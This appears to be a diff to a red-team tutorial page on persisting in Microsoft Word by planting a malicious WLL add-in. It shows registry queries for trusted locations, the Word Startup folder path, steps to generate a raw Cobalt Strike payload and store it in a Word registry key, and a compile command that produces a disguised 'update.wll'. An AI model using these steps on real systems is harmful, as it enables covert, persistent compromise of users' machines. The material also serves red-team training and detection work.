@@ -11,7 +11,11 @@ toc: true
 ---
 
 
+## What is a WLL file?
+A WLL file is an add-in used by Microsoft Word, a word processing application. It contains a software component that adds new features to the program, similar to a plugin. 
+
 ## Registry query for trusted location path
+find the trusted location by querying the register
 ```
 reg query x64 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\Security\Trusted Locations\Location2
 ```
@@ -23,9 +27,6 @@ reg query x64 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Office\14.0\Word\Security\Tru
 ```
 cd C:\Users\NoRed0x\AppData\Roaming\Microsoft\Word\Startup
 ```
-
-<img src="/img/p/office.PNG" alt="Getting-gz" width="800" height="110"> 
-
 
 
 
@@ -43,7 +44,7 @@ if __name__ == '__main__':
 ```
 
 ## Commands for updating registry with Cobalt Strike payload
-Generatpayload.bin by cobalt
+Generate payload.bin by cobalt
 ```
 1-tap attacks >> packages >>payload generator >> select listener  +select  output >> Raw
 save payload.bin
@@ -68,11 +69,15 @@ powerpick New-ItemProperty -Path "HKCU:\SOFTWARE\Microsoft\Office\14.0\Word" -Na
 
 
 ## verify that your value has been added
+```
+reg query x64 HKCU\SOFTWARE\Microsoft\Office\16.0\Word
+```
 
 <img src="/img/p/5.PNG" alt="Getting-gz" width="600" height="150"> 
 
 
 ##  Compiling WLL
+compile the wll
 ```
 i686-w64-mingw32-g++ -Wno-narrowing -shared wlltemplate.cpp -o update.wll
 strip update.wll
